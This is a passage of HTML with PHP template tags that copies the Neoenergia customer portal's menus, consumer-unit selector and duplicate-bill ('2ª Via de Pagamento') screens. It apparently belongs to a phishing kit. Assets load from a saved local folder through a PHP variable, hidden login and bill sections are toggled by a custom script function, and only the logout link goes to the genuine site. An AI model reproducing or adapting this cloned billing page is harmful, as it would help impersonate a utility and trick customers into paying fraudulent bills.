                        </div>
                    </div>
                    <div class="opcoes-desktop close-menu">
                        <div class="width-agencia">
                            <div class="row opcoes-detalhadas">
                                <ul class="col-auto close-menu ng-star-inserted">
                                    <h6 class="titulo-subconjunto close-menu"> Meu perfil </h6>
                                    <li class="servico-subconjunto close-menu ng-star-inserted"><a>Cadastro de
                                            Parceiro</a></li>
                                    <!---->
                                    <!---->
                                    <!---->
                                </ul>
                                <ul class="col-auto close-menu ng-star-inserted">
                                    <h6 class="titulo-subconjunto close-menu"> Solicitações </h6>
                                    <li class="servico-subconjunto close-menu ng-star-inserted"><a>Atualização
                                            Cadastral</a></li>
                                    <!---->
                                    <!---->
                                    <li class="servico-subconjunto close-menu ng-star-inserted"><a>Vínculo de Unidade
                                            Consumidora</a></li>
                                    <!---->
                                    <!---->
                                    <!---->
                                </ul>
                                <!---->
                            </div>
                        </div>
                    </div>
                </nav>
            </header>
            <mat-sidenav-container class="mat-drawer-container mat-sidenav-container custom-sidenav-content">
                <div class="mat-drawer-backdrop ng-star-inserted"></div>
                <!---->
                <div class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                <mat-sidenav tabindex="-1"
                    class="mat-drawer mat-sidenav ng-tns-c74-1 ng-trigger ng-trigger-transform mat-drawer-over ng-star-inserted"
                    style="box-shadow: none; visibility: hidden;">
                    <div cdkscrollable="" class="mat-drawer-inner-container ng-tns-c74-1">
                        <mat-expansion-panel class="mat-expansion-panel ng-tns-c145-2 ng-tns-c74-1 ng-star-inserted"
                            style="">
                            <!---->
                            <div role="region"
                                class="mat-expansion-panel-content ng-tns-c145-2 ng-trigger ng-trigger-bodyExpansion"
                                id="cdk-accordion-child-0" aria-labelledby="mat-expansion-panel-header-0"
                                style="height: 0px; visibility: hidden;">
                                <div class="mat-expansion-panel-body ng-tns-c145-2">
                                    <app-infos-usuario class="ng-tns-c145-2">
                                        <section class="infos-usuario">
                                            <article>
                                                <h2>Boas vindas</h2>
                                                <h4></h4>
                                                <!---->
                                                <mat-accordion class="mat-accordion">
                                                    <mat-expansion-panel class="mat-expansion-panel ng-tns-c145-7">
                                                        <mat-expansion-panel-header role="button"
                                                            class="mat-expansion-panel-header mat-focus-indicator ng-tns-c147-8 ng-tns-c145-7 mat-expansion-toggle-indicator-after ng-star-inserted"
                                                            id="mat-expansion-panel-header-1" tabindex="0"
                                                            aria-controls="cdk-accordion-child-1" aria-expanded="false"
                                                            aria-disabled="false" style=""><span
                                                                class="mat-content ng-tns-c147-8"> Neoenergia
                                                            </span><span
                                                                class="mat-expansion-indicator ng-tns-c147-8 ng-trigger ng-trigger-indicatorRotate ng-star-inserted"
                                                                style="transform: rotate(0deg);"></span>
                                                            <!---->
                                                        </mat-expansion-panel-header>
                                                        <div role="region"
                                                            class="mat-expansion-panel-content ng-tns-c145-7 ng-trigger ng-trigger-bodyExpansion"
                                                            id="cdk-accordion-child-1"
                                                            aria-labelledby="mat-expansion-panel-header-1"
                                                            style="height: 0px; visibility: hidden;">
                                                            <div class="mat-expansion-panel-body ng-tns-c145-7">
                                                                <ul class="ng-tns-c145-7">
                                                                    <li> Trocar Estado </li>
                                                                </ul>
                                                                <!---->
                                                            </div>
                                                        </div>
                                                    </mat-expansion-panel>
                                                    <!---->
                                                </mat-accordion>
                                            </article>
                                            <mat-divider role="separator" class="mat-divider mat-divider-horizontal"
                                                aria-orientation="horizontal"></mat-divider>
                                            <article class="ng-star-inserted" style="">
                                                <div class="menu__dados-usuario">
                                                    <h6>Documento Fiscal</h6>
                                                    <p></p>
                                                </div>
                                            </article>
                                            <!---->
                                            <!---->
                                            <mat-divider role="separator" class="mat-divider mat-divider-horizontal"
                                                aria-orientation="horizontal"></mat-divider>
                                            <article class="menu__cliente-options">
                                                <p><img src="./<?= $diretorio ?>//index_files/account_circle.svg"
                                                        alt="Minha Conta"><a>Minha Conta</a></p>
                                                <!---->
                                                <p><img src="./<?= $diretorio ?>//index_files/logout.svg" alt="Sair"><a
                                                        href="https://agenciavirtual.neoenergia.com/">Sair</a></p>
                                            </article>
                                        </section>
                                    </app-infos-usuario>
                                    <!---->
                                </div>
                            </div>
                        </mat-expansion-panel>
                        <!----><button type="button" mat-button="" color="primary"
                            class="mat-focus-indicator d-flex align-items-center w-100 mt-3 mat-button mat-button-base mat-primary ng-tns-c74-1"><span
                                class="mat-button-wrapper">
                                <mat-icon role="img" class="mat-icon notranslate material-icons mat-icon-no-color"
                                    aria-hidden="true" data-mat-icon-type="font">home</mat-icon><strong>Início</strong>
                            </span><span matripple="" class="mat-ripple mat-button-ripple"></span><span
                                class="mat-button-focus-overlay"></span></button>
                        <mat-list class="mat-list mat-list-base mb-3 ng-star-inserted" style="">
                            <mat-list-item class="mat-list-item mat-focus-indicator"><span
                                    class="mat-list-item-content"><span mat-ripple=""
                                        class="mat-ripple mat-list-item-ripple"></span><span
                                        class="mat-list-text"></span><strong class="color-primary bold">Para
                                        Você</strong></span></mat-list-item>
                            <mat-expansion-panel
                                class="mat-expansion-panel lista-itens ng-tns-c145-29 ng-star-inserted">
                                <mat-expansion-panel-header role="button"
                                    class="mat-expansion-panel-header mat-focus-indicator ng-tns-c147-30 ng-tns-c145-29 ng-star-inserted"
                                    id="mat-expansion-panel-header-12" tabindex="0"
                                    aria-controls="cdk-accordion-child-12" aria-expanded="false" aria-disabled="false">
                                    <span class="mat-content ng-tns-c147-30">
                                        <mat-panel-title class="mat-expansion-panel-header-title ng-tns-c147-30">Meu
                                            Perfil</mat-panel-title>
                                    </span><span
                                        class="mat-expansion-indicator ng-tns-c147-30 ng-trigger ng-trigger-indicatorRotate ng-star-inserted"
                                        style="transform: rotate(0deg);"></span>
                                    <!---->
                                </mat-expansion-panel-header>
                                <div role="region"
                                    class="mat-expansion-panel-content ng-tns-c145-29 ng-trigger ng-trigger-bodyExpansion"
                                    id="cdk-accordion-child-12" aria-labelledby="mat-expansion-panel-header-12"
                                    style="height: 0px; visibility: hidden;">
                                    <div class="mat-expansion-panel-body ng-tns-c145-29">
                                        <mat-nav-list role="navigation"
                                            class="mat-nav-list mat-list-base ng-tns-c145-29">
                                            <mat-list-item
                                                class="mat-list-item mat-focus-indicator servico-subconjunto-mobile ng-star-inserted"
                                                style=""><span class="mat-list-item-content"><span mat-ripple=""
                                                        class="mat-ripple mat-list-item-ripple"></span><span
                                                        class="mat-list-text"></span><a>Cadastro de Parceiro</a></span>
                                            </mat-list-item>
                                            <!---->
                                        </mat-nav-list>
                                        <!---->
                                    </div>
                                </div>
                            </mat-expansion-panel>
                            <!---->
                            <mat-expansion-panel
                                class="mat-expansion-panel lista-itens ng-tns-c145-31 ng-star-inserted">
                                <mat-expansion-panel-header role="button"
                                    class="mat-expansion-panel-header mat-focus-indicator ng-tns-c147-32 ng-tns-c145-31 ng-star-inserted"
                                    id="mat-expansion-panel-header-13" tabindex="0"
                                    aria-controls="cdk-accordion-child-13" aria-expanded="false" aria-disabled="false">
                                    <span class="mat-content ng-tns-c147-32">
                                        <mat-panel-title class="mat-expansion-panel-header-title ng-tns-c147-32">
                                            Solicitações</mat-panel-title>
                                    </span><span
                                        class="mat-expansion-indicator ng-tns-c147-32 ng-trigger ng-trigger-indicatorRotate ng-star-inserted"
                                        style="transform: rotate(0deg);"></span>
                                    <!---->
                                </mat-expansion-panel-header>
                                <div role="region"
                                    class="mat-expansion-panel-content ng-tns-c145-31 ng-trigger ng-trigger-bodyExpansion"
                                    id="cdk-accordion-child-13" aria-labelledby="mat-expansion-panel-header-13"
                                    style="height: 0px; visibility: hidden;">
                                    <div class="mat-expansion-panel-body ng-tns-c145-31">
                                        <mat-nav-list role="navigation"
                                            class="mat-nav-list mat-list-base ng-tns-c145-31">
                                            <mat-list-item
                                                class="mat-list-item mat-focus-indicator servico-subconjunto-mobile ng-star-inserted"
                                                style=""><span class="mat-list-item-content"><span mat-ripple=""
                                                        class="mat-ripple mat-list-item-ripple"></span><span
                                                        class="mat-list-text"></span><a>Atualização Cadastral</a></span>
                                            </mat-list-item>
                                            <mat-list-item
                                                class="mat-list-item mat-focus-indicator servico-subconjunto-mobile ng-star-inserted"
                                                style=""><span class="mat-list-item-content"><span mat-ripple=""
                                                        class="mat-ripple mat-list-item-ripple"></span><span
                                                        class="mat-list-text"></span><a>Vínculo de Unidade
                                                        Consumidora</a></span></mat-list-item>
                                            <!---->
                                        </mat-nav-list>
                                        <!---->
                                    </div>
                                </div>
                            </mat-expansion-panel>
                            <!---->
                            <!---->
                        </mat-list>
                        <mat-list class="mat-list mat-list-base mb-3 ng-star-inserted" style="">
                            <mat-list-item class="mat-list-item mat-focus-indicator"><span
                                    class="mat-list-item-content"><span mat-ripple=""
                                        class="mat-ripple mat-list-item-ripple"></span><span
                                        class="mat-list-text"></span><strong class="color-primary bold">Para A Unidade
                                        Consumidora</strong></span></mat-list-item>
                            <mat-expansion-panel
                                class="mat-expansion-panel lista-itens ng-tns-c145-33 ng-star-inserted">
                                <mat-expansion-panel-header role="button"
                                    class="mat-expansion-panel-header mat-focus-indicator ng-tns-c147-34 ng-tns-c145-33 ng-star-inserted"
                                    id="mat-expansion-panel-header-14" tabindex="0"
                                    aria-controls="cdk-accordion-child-14" aria-expanded="false" aria-disabled="false">
                                    <span class="mat-content ng-tns-c147-34">
                                        <mat-panel-title class="mat-expansion-panel-header-title ng-tns-c147-34">Energia
                                        </mat-panel-title>
                                    </span><span
                                        class="mat-expansion-indicator ng-tns-c147-34 ng-trigger ng-trigger-indicatorRotate ng-star-inserted"
                                        style="transform: rotate(0deg);"></span>
                                    <!---->
                                </mat-expansion-panel-header>
                                <div role="region"
                                    class="mat-expansion-panel-content ng-tns-c145-33 ng-trigger ng-trigger-bodyExpansion"
                                    id="cdk-accordion-child-14" aria-labelledby="mat-expansion-panel-header-14"
                                    style="height: 0px; visibility: hidden;">
                                    <div class="mat-expansion-panel-body ng-tns-c145-33">
                                        <mat-nav-list role="navigation"
                                            class="mat-nav-list mat-list-base ng-tns-c145-33">
                                            <mat-list-item
                                                class="mat-list-item mat-focus-indicator servico-subconjunto-mobile ng-star-inserted"
                                                style=""><span class="mat-list-item-content"><span mat-ripple=""
                                                        class="mat-ripple mat-list-item-ripple"></span><span
                                                        class="mat-list-text"></span><a>Troca de Titularidade</a></span>
                                            </mat-list-item>
                                            <mat-list-item
                                                class="mat-list-item mat-focus-indicator servico-subconjunto-mobile ng-star-inserted"
                                                style=""><span class="mat-list-item-content"><span mat-ripple=""
                                                        class="mat-ripple mat-list-item-ripple"></span><span
                                                        class="mat-list-text"></span><a>Ligação Nova</a></span>
                                            </mat-list-item>
                                            <mat-list-item
                                                class="mat-list-item mat-focus-indicator servico-subconjunto-mobile ng-star-inserted"
                                                style=""><span class="mat-list-item-content"><span mat-ripple=""
                                                        class="mat-ripple mat-list-item-ripple"></span><span
                                                        class="mat-list-text"></span><a>Projeto Particular</a></span>
                                            </mat-list-item>
                                            <!---->
                                        </mat-nav-list>
                                        <!---->
                                    </div>
                                </div>
                            </mat-expansion-panel>
                            <!---->
                            <!---->
                        </mat-list>
                        <mat-list class="mat-list mat-list-base mb-3 ng-star-inserted" style="">
                            <mat-list-item class="mat-list-item mat-focus-indicator"><span
                                    class="mat-list-item-content"><span mat-ripple=""
                                        class="mat-ripple mat-list-item-ripple"></span><span
                                        class="mat-list-text"></span><strong class="color-primary bold">Fale
                                        Conosco</strong></span></mat-list-item>
                            <mat-expansion-panel
                                class="mat-expansion-panel lista-itens ng-tns-c145-17 ng-star-inserted">
                                <mat-expansion-panel-header role="button"
                                    class="mat-expansion-panel-header mat-focus-indicator ng-tns-c147-18 ng-tns-c145-17 ng-star-inserted"
                                    id="mat-expansion-panel-header-6" tabindex="0" aria-controls="cdk-accordion-child-6"
                                    aria-expanded="false" aria-disabled="false"><span
                                        class="mat-content ng-tns-c147-18">
                                        <mat-panel-title class="mat-expansion-panel-header-title ng-tns-c147-18">Fale
                                            Conosco</mat-panel-title>
                                    </span><span
                                        class="mat-expansion-indicator ng-tns-c147-18 ng-trigger ng-trigger-indicatorRotate ng-star-inserted"
                                        style="transform: rotate(0deg);"></span>
                                    <!---->
                                </mat-expansion-panel-header>
                                <div role="region"
                                    class="mat-expansion-panel-content ng-tns-c145-17 ng-trigger ng-trigger-bodyExpansion"
                                    id="cdk-accordion-child-6" aria-labelledby="mat-expansion-panel-header-6"
                                    style="height: 0px; visibility: hidden;">
                                    <div class="mat-expansion-panel-body ng-tns-c145-17">
                                        <mat-nav-list role="navigation"
                                            class="mat-nav-list mat-list-base ng-tns-c145-17">
                                            <mat-list-item
                                                class="mat-list-item mat-focus-indicator servico-subconjunto-mobile ng-star-inserted"
                                                style=""><span class="mat-list-item-content"><span mat-ripple=""
                                                        class="mat-ripple mat-list-item-ripple"></span><span
                                                        class="mat-list-text"></span><a>Denúncia de Ética</a></span>
                                            </mat-list-item>
                                            <!---->
                                        </mat-nav-list>
                                        <!---->
                                    </div>
                                </div>
                            </mat-expansion-panel>
                            <!---->
                            <!---->
                        </mat-list>
                        <mat-list class="mat-list mat-list-base mb-3 ng-star-inserted" style="">
                            <mat-list-item class="mat-list-item mat-focus-indicator"><span
                                    class="mat-list-item-content"><span mat-ripple=""
                                        class="mat-ripple mat-list-item-ripple"></span><span
                                        class="mat-list-text"></span><strong
                                        class="color-primary bold">Neoenergia</strong></span></mat-list-item>
                            <mat-expansion-panel
                                class="mat-expansion-panel lista-itens ng-tns-c145-19 ng-star-inserted">
                                <mat-expansion-panel-header role="button"
                                    class="mat-expansion-panel-header mat-focus-indicator ng-tns-c147-20 ng-tns-c145-19 ng-star-inserted"
                                    id="mat-expansion-panel-header-7" tabindex="0" aria-controls="cdk-accordion-child-7"
                                    aria-expanded="false" aria-disabled="false"><span
                                        class="mat-content ng-tns-c147-20">
                                        <mat-panel-title class="mat-expansion-panel-header-title ng-tns-c147-20">Sobre
                                            Nós</mat-panel-title>
                                    </span><span
                                        class="mat-expansion-indicator ng-tns-c147-20 ng-trigger ng-trigger-indicatorRotate ng-star-inserted"
                                        style="transform: rotate(0deg);"></span>
                                    <!---->
                                </mat-expansion-panel-header>
                                <div role="region"
                                    class="mat-expansion-panel-content ng-tns-c145-19 ng-trigger ng-trigger-bodyExpansion"
                                    id="cdk-accordion-child-7" aria-labelledby="mat-expansion-panel-header-7"
                                    style="height: 0px; visibility: hidden;">
                                    <div class="mat-expansion-panel-body ng-tns-c145-19">
                                        <mat-nav-list role="navigation"
                                            class="mat-nav-list mat-list-base ng-tns-c145-19">
                                            <mat-list-item
                                                class="mat-list-item mat-focus-indicator servico-subconjunto-mobile ng-star-inserted"
                                                style=""><span class="mat-list-item-content"><span mat-ripple=""
                                                        class="mat-ripple mat-list-item-ripple"></span><span
                                                        class="mat-list-text"></span><a>A Neoenergia</a></span>
                                            </mat-list-item>
                                            <mat-list-item
                                                class="mat-list-item mat-focus-indicator servico-subconjunto-mobile ng-star-inserted"
                                                style=""><span class="mat-list-item-content"><span mat-ripple=""
                                                        class="mat-ripple mat-list-item-ripple"></span><span
                                                        class="mat-list-text"></span><a>Campanhas e Promoções</a></span>
                                            </mat-list-item>
                                            <mat-list-item
                                                class="mat-list-item mat-focus-indicator servico-subconjunto-mobile ng-star-inserted"
                                                style=""><span class="mat-list-item-content"><span mat-ripple=""
                                                        class="mat-ripple mat-list-item-ripple"></span><span
                                                        class="mat-list-text"></span><a>Canais de Atendimento</a></span>
                                            </mat-list-item>
                                            <mat-list-item
                                                class="mat-list-item mat-focus-indicator servico-subconjunto-mobile ng-star-inserted"
                                                style=""><span class="mat-list-item-content"><span mat-ripple=""
                                                        class="mat-ripple mat-list-item-ripple"></span><span
                                                        class="mat-list-text"></span><a>Políticas e Avisos de
                                                        Privacidade</a></span></mat-list-item>
                                            <!---->
                                        </mat-nav-list>
                                        <!---->
                                    </div>
                                </div>
                            </mat-expansion-panel>
                            <!---->
                            <mat-expansion-panel
                                class="mat-expansion-panel lista-itens ng-tns-c145-21 ng-star-inserted">
                                <mat-expansion-panel-header role="button"
                                    class="mat-expansion-panel-header mat-focus-indicator ng-tns-c147-22 ng-tns-c145-21 ng-star-inserted"
                                    id="mat-expansion-panel-header-8" tabindex="0" aria-controls="cdk-accordion-child-8"
                                    aria-expanded="false" aria-disabled="false"><span
                                        class="mat-content ng-tns-c147-22">
                                        <mat-panel-title class="mat-expansion-panel-header-title ng-tns-c147-22">Nossas
                                            Redes</mat-panel-title>
                                    </span><span
                                        class="mat-expansion-indicator ng-tns-c147-22 ng-trigger ng-trigger-indicatorRotate ng-star-inserted"
                                        style="transform: rotate(0deg);"></span>
                                    <!---->
                                </mat-expansion-panel-header>
                                <div role="region"
                                    class="mat-expansion-panel-content ng-tns-c145-21 ng-trigger ng-trigger-bodyExpansion"
                                    id="cdk-accordion-child-8" aria-labelledby="mat-expansion-panel-header-8"
                                    style="height: 0px; visibility: hidden;">
                                    <div class="mat-expansion-panel-body ng-tns-c145-21">
                                        <mat-nav-list role="navigation"
                                            class="mat-nav-list mat-list-base ng-tns-c145-21">
                                            <mat-list-item
                                                class="mat-list-item mat-focus-indicator servico-subconjunto-mobile ng-star-inserted"
                                                style=""><span class="mat-list-item-content"><span mat-ripple=""
                                                        class="mat-ripple mat-list-item-ripple"></span><span
                                                        class="mat-list-text"></span><a>YouTube</a></span>
                                            </mat-list-item>
                                            <mat-list-item
                                                class="mat-list-item mat-focus-indicator servico-subconjunto-mobile ng-star-inserted"
                                                style=""><span class="mat-list-item-content"><span mat-ripple=""
                                                        class="mat-ripple mat-list-item-ripple"></span><span
                                                        class="mat-list-text"></span><a>Facebook</a></span>
                                            </mat-list-item>
                                            <mat-list-item
                                                class="mat-list-item mat-focus-indicator servico-subconjunto-mobile ng-star-inserted"
                                                style=""><span class="mat-list-item-content"><span mat-ripple=""
                                                        class="mat-ripple mat-list-item-ripple"></span><span
                                                        class="mat-list-text"></span><a>Instagram</a></span>
                                            </mat-list-item>
                                            <mat-list-item
                                                class="mat-list-item mat-focus-indicator servico-subconjunto-mobile ng-star-inserted"
                                                style=""><span class="mat-list-item-content"><span mat-ripple=""
                                                        class="mat-ripple mat-list-item-ripple"></span><span
                                                        class="mat-list-text"></span><a>X.com</a></span></mat-list-item>
                                            <mat-list-item
                                                class="mat-list-item mat-focus-indicator servico-subconjunto-mobile ng-star-inserted"
                                                style=""><span class="mat-list-item-content"><span mat-ripple=""
                                                        class="mat-ripple mat-list-item-ripple"></span><span
                                                        class="mat-list-text"></span><a>Linkedin</a></span>
                                            </mat-list-item>
                                            <mat-list-item
                                                class="mat-list-item mat-focus-indicator servico-subconjunto-mobile ng-star-inserted"
                                                style=""><span class="mat-list-item-content"><span mat-ripple=""
                                                        class="mat-ripple mat-list-item-ripple"></span><span
                                                        class="mat-list-text"></span><a>Tik Tok</a></span>
                                            </mat-list-item>
                                            <!---->
                                        </mat-nav-list>
                                        <!---->
                                    </div>
                                </div>
                            </mat-expansion-panel>
                            <!---->
                            <!---->
                        </mat-list>
                        <!---->
                    </div>
                </mat-sidenav>
                <div class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                <mat-sidenav-content class="mat-drawer-content mat-sidenav-content custom-sidenav-content">
                    <div class="espaco-footer width-agencia">
                        <router-outlet></router-outlet>

                        <div class="basefaturas" style="display:none;">
                            <app-login _nghost-xji-c231="" class="ng-star-inserted">
                                <router-outlet _ngcontent-xji-c231=""></router-outlet>
                                <app-acesso-faturas-segunda-via _nghost-xji-c251="" class="ng-star-inserted">
                                    <div _ngcontent-xji-c251="" class="width-agencia mt-padrao">
                                        <div _ngcontent-xji-c251="" class="row">
                                            <div _ngcontent-xji-c251="" class="col-4 col-sm-8 col-xl-8"></div>
                                            <div _ngcontent-xji-c251="" class="col-5 col-sm-4 pe-0">
                                                <app-protocolo-informativo _ngcontent-xji-c251="" _nghost-xji-c168="">
                                                    <div _ngcontent-xji-c168=""
                                                        class="d-flex justify-content-end ng-star-inserted">
                                                        <div _ngcontent-xji-c168=""
                                                            class="d-flex gap-2 p-2 protocolo-container"><span
                                                                _ngcontent-xji-c168="" class="protocolo-label">
                                                                PROTOCOLO: </span><span _ngcontent-xji-c168=""
                                                                class="protocolo-text"> </span></div>
                                                    </div>
                                                    <!---->
                                                    <!---->
                                                    <!---->
                                                </app-protocolo-informativo>
                                            </div>
                                        </div>

                <div class="endereco-faturas">
<app-acesso-ucs-segunda-via _nghost-qxf-c253="" class="ng-star-inserted">
    <div _ngcontent-qxf-c253="" class="width-agencia mt-padrao">
        <h2 _ngcontent-qxf-c253="">Selecione a unidade consumidora</h2>
        <p _ngcontent-qxf-c253="" class="subtitulo mt-3 mb-3"> Escolha abaixo a unidade consumidora que deseja consultar: </p>
        <app-unidade-consumidora _ngcontent-qxf-c253="" _nghost-qxf-c252="">
            <div _ngcontent-qxf-c252="">
            <table _ngcontent-qxf-c252=""><caption _ngcontent-qxf-c252=""></caption>
            <thead _ngcontent-qxf-c252="">
                
        <tr _ngcontent-qxf-c252=""><th _ngcontent-qxf-c252="" id="unidade-consumidora"></th>
            <th _ngcontent-qxf-c252="" id="endereco-unidade-consumidora"></th><th _ngcontent-qxf-c252="" id="botao-status-unidade-consumidora"></th>
        </tr></thead><tbody _ngcontent-qxf-c252="" class="endereco-faturas-list">
            <tr _ngcontent-qxf-c252="" class="ng-star-inserted">
            <td _ngcontent-qxf-c252="">
            <div _ngcontent-qxf-c252="" class="col-12 box-imoveis text-left">
                <div _ngcontent-qxf-c252="" class="row d-flex justify-content-between cursor-pointer container-rows">
                    <div _ngcontent-qxf-c252="" class="col-11 d-flex flex-wrap">
                        <div _ngcontent-qxf-c252="" class="col-12 col-md-4 col-lg-4 pb-md-0 pb-2">
                            <div _ngcontent-qxf-c252="" class="unidade-consumidora-title pb-2"> UNIDADE CONSUMIDORA </div>
                            <div _ngcontent-qxf-c252="" class="unidade-consumidora-value"> 70******81 </div></div>
                            <div _ngcontent-qxf-c252="" class="col-12 col-md-4 col-lg-4 pb-md-0 pb-2">
                                <div _ngcontent-qxf-c252="" class="unidade-consumidora-title pb-2"> ENDEREÇO </div>
                                <div _ngcontent-qxf-c252="" class="endereco"> RU* DO UR***AI 43 CS 02 CE*******AS D AV*LA DI** DA**LA BA </div>
                            </div></div><div _ngcontent-qxf-c252="" class="col-1"><mat-icon _ngcontent-qxf-c252="">
                                <span _ngcontent-qxf-c252="" class="material-icons-outlined">expand_more</span></mat-icon>
                            </div></div></div></td></tr><!----></tbody></table></div></app-unidade-consumidora>
                            <div _ngcontent-qxf-c253="" class="mt-2"><app-neo-button _ngcontent-qxf-c253="" _nghost-qxf-c97="">
                                 </app-neo-button>
                                </div></div></app-acesso-ucs-segunda-via>
                                        </div>

                                        <div class="faturas-bertas" style="display:none;">
                                        <h2 _ngcontent-xji-c251="">2ª Via de Pagamento</h2>
                                        <p _ngcontent-xji-c251="" class="subtitulo mt-3 mb-3"> Aqui você visualiza o
                                            código de barras da sua fatura Cosern em aberto, de maneira rápida e fácil.
                                        </p>
                                        <div _ngcontent-xji-c251="" class="row mt-5 mb-5 card-observacoes">
                                            <div _ngcontent-xji-c251="" class="col-12 col-sm-6">
                                                <app-tabela-vertical _ngcontent-xji-c251="" _nghost-xji-c245=""
                                                    class="ng-star-inserted">
                                                    <table _ngcontent-xji-c245="" id="table-vertical" class="table">
                                                        <thead _ngcontent-xji-c245="">
                                                            <tr _ngcontent-xji-c245="" class="ng-star-inserted">
                                                                <th _ngcontent-xji-c245="" class="fw-normal">CÓDIGO DO
                                                                    CLIENTE</th>
                                                            </tr>
                                                            <tr _ngcontent-xji-c245="" class="ng-star-inserted">
                                                                <th _ngcontent-xji-c245=""
                                                                    class="fw-normal ultimo-elemento">ENDEREÇO</th>
                                                            </tr>
                                                            <!---->
                                                        </thead>
                                                        <tbody _ngcontent-xji-c245="">
                                                            <tr _ngcontent-xji-c245="" class="ng-star-inserted">
                                                                <td _ngcontent-xji-c245=""
                                                                    class="fw-bold undefined txtuc"> </td>
                                                            </tr>
                                                            <tr _ngcontent-xji-c245="" class="ng-star-inserted">
                                                                <td _ngcontent-xji-c245=""
                                                                    class="fw-bold undefined ultimo-elemento txtend">
                                                                </td>
                                                            </tr>
                                                            <!---->
                                                        </tbody>
                                                    </table>
                                                </app-tabela-vertical>
                                                <!---->
                                            </div>
                                        </div>
                                        <div _ngcontent-xji-c251="" class="ng-star-inserted">
                                            <div _ngcontent-xji-c251="" class="listagem-faturas-header"> Faturas em
                                                aberto </div>
                                            <app-listar-faturas _ngcontent-xji-c251="">
                                                <div id="listar-faturas-abertas" class="ng-star-inserted">

                                                </div>
                                                <!---->
                                            </app-listar-faturas>
                                        </div>
                                        </div>
                                        <!---->
                                        <!---->
                                        <div _ngcontent-xji-c251="" class="mt-5 col-12 col-sm-8">
                                            <p _ngcontent-xji-c251="" class="texto-atencao">Atenção! O pagamento pode
                                                demorar até 3 dias úteis para ser compensado e identificado.</p>
                                            <div _ngcontent-xji-c251=""><label _ngcontent-xji-c251="" for="valor-fatura"
                                                    class="fw-bold">Valores das faturas em aberto:</label>
                                                <p _ngcontent-xji-c251="" id="valor-fatura"> Este valor corresponde ao
                                                    débito atual da unidade consumidora informada. Para as faturas pagas
                                                    após a data de vencimento, serão incididos juros e multas no próximo
                                                    mês de faturamento. </p>
                                            </div>
                                        </div>
                                        <div _ngcontent-xji-c251="" class="d-flex gap-3">
                                            <div _ngcontent-xji-c251="" class="mt-5">
                                                <app-neo-button _ngcontent-xji-c251="" _nghost-xji-c97=""><button onclick="Endderecos()"
                                                        _ngcontent-xji-c97="" class="btn-neoprimary" title="Voltar"
                                                        type="button">
                                                        <div _ngcontent-xji-c97="" class="pe-2 ps-2">VOLTAR</div>
                                                    </button></app-neo-button>
                                            </div>
                                            <div _ngcontent-xji-c251="" class="mt-5">
                                                <app-neo-button _ngcontent-xji-c251="" _nghost-xji-c97=""><button onclick="Endderecos()"
                                                        _ngcontent-xji-c97="" class="btn-neoprimary" title="Fechar"
                                                        type="button">
                                                        <div _ngcontent-xji-c97="" class="pe-2 ps-2">FECHAR</div>
                                                    </button></app-neo-button>
                                            </div>
                                        </div>
                                    </div>
                                </app-acesso-faturas-segunda-via>
                                <!---->
                            </app-login>
                        </div>

                        <div class="baselogin" style="display:none;">
                            <app-login _nghost-icv-c231="" class="ng-star-inserted boxlocal">
                                <router-outlet _ngcontent-icv-c231=""></router-outlet>
                                <app-tipo-acesso-segunda-via class="ng-star-inserted">
                                    <div id="card-acesso-segunda-via" class="width-agencia mt-padrao">
                                        <div class="row">
                                            <div class="col-4 col-sm-8 col-xl-8"></div>
                                            <div class="col-5 col-sm-4 pe-0">
                                                <app-protocolo-informativo _nghost-icv-c168="">
                                                    <!---->
                                                    <!---->
                                                    <!---->
                                                </app-protocolo-informativo>
                                            </div>
                                        </div>
                                        <mat-card class="mat-card mat-focus-indicator py-5">
                                            <div class="p-4">
                                                <h2><strong>2ª Via de Pagamento</strong></h2>
                                                <p class="texto ng-star-inserted"><strong>Selecione o Estado</strong>
                                                </p>
                                                <!---->
                                                <!---->
                                                <!---->
                                                <form novalidate="" class="row ng-untouched ng-pristine ng-invalid">
                                                    <div class="ng-star-inserted">
                                                        <mat-selection-list role="listbox" formcontrolname="estado"
                                                            class="mat-selection-list mat-list-base ng-untouched ng-pristine ng-invalid"
                                                            aria-multiselectable="false" aria-disabled="false"
                                                            tabindex="0">
                                                            <mat-list-option role="option"
                                                                class="mat-list-item mat-list-option mat-focus-indicator mat-accent ng-star-inserted"
                                                                aria-selected="false" aria-disabled="false"
                                                                tabindex="-1">
                                                                <div
                                                                    class="mat-list-item-content mat-list-item-content-reverse">
                                                                    <div mat-ripple=""
                                                                        class="mat-ripple mat-list-item-ripple"></div>
                                                                    <!---->
                                                                    <div class="mat-list-text"> Bahia </div>
                                                                </div>
                                                            </mat-list-option>
                                                            <mat-list-option role="option"
                                                                class="mat-list-item mat-list-option mat-focus-indicator mat-accent ng-star-inserted"
                                                                aria-selected="false" aria-disabled="false"
                                                                tabindex="-1">
                                                                <div
                                                                    class="mat-list-item-content mat-list-item-content-reverse">
                                                                    <div mat-ripple=""
                                                                        class="mat-ripple mat-list-item-ripple"></div>
                                                                    <!---->
                                                                    <div class="mat-list-text"> Mato Grosso do Sul
                                                                    </div>
                                                                </div>
                                                            </mat-list-option>
                                                            <mat-list-option role="option"
                                                                class="mat-list-item mat-list-option mat-focus-indicator mat-accent ng-star-inserted"
                                                                aria-selected="false" aria-disabled="false"
                                                                tabindex="-1">
                                                                <div
                                                                    class="mat-list-item-content mat-list-item-content-reverse">
                                                                    <div mat-ripple=""
                                                                        class="mat-ripple mat-list-item-ripple"></div>
                                                                    <!---->
                                                                    <div class="mat-list-text"> Pernambuco </div>
                                                                </div>
                                                            </mat-list-option>
                                                            <mat-list-option role="option"
                                                                class="mat-list-item mat-list-option mat-focus-indicator mat-accent ng-star-inserted"
                                                                aria-selected="false" aria-disabled="false"
                                                                tabindex="-1">
                                                                <div
                                                                    class="mat-list-item-content mat-list-item-content-reverse">
                                                                    <div mat-ripple=""
                                                                        class="mat-ripple mat-list-item-ripple"></div>
                                                                    <!---->
                                                                    <div class="mat-list-text"> Rio Grande do Norte
                                                                    </div>
                                                                </div>
                                                            </mat-list-option>
                                                            <mat-list-option role="option"
                                                                class="mat-list-item mat-list-option mat-focus-indicator mat-accent ng-star-inserted"
                                                                aria-selected="false" aria-disabled="false"
                                                                tabindex="-1">
                                                                <div
                                                                    class="mat-list-item-content mat-list-item-content-reverse">
                                                                    <div mat-ripple=""
                                                                        class="mat-ripple mat-list-item-ripple"></div>
                                                                    <!---->
                                                                    <div class="mat-list-text"> São Paulo </div>
                                                                </div>
                                                            </mat-list-option>
